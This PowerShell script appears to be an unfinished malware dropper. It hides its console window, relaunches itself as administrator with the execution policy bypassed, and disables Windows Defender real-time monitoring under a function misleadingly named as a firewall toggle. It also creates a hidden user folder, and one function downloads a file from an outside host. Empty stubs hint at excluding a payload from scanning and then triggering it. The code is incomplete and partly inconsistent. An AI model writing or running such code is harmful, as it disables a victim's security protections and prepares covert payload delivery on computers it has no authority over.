Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
}

function RunAdminAndBypass
{
	if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
	}
	Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
}

function TurnOffFirewall
{
	Set-MpPreference -DisableRealtimeMonitoring $true
}

function TurnOnFirewall
{
	Set-MpPreference -DisableRealtimeMonitoring $false
}

function DownloadExeShell
{
	New-Item -Path "C:\Users\$env:UserName\" -Name "winfiles" -ItemType "directory"
	attrib +h C:\Users\$env:UserName\winfiles
	(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
}

function ExcludeExeShell
{
	
}

function TriggerExecution
{
	
}

Hide-Console
RunAdminAndBypass
TurnOffFirewall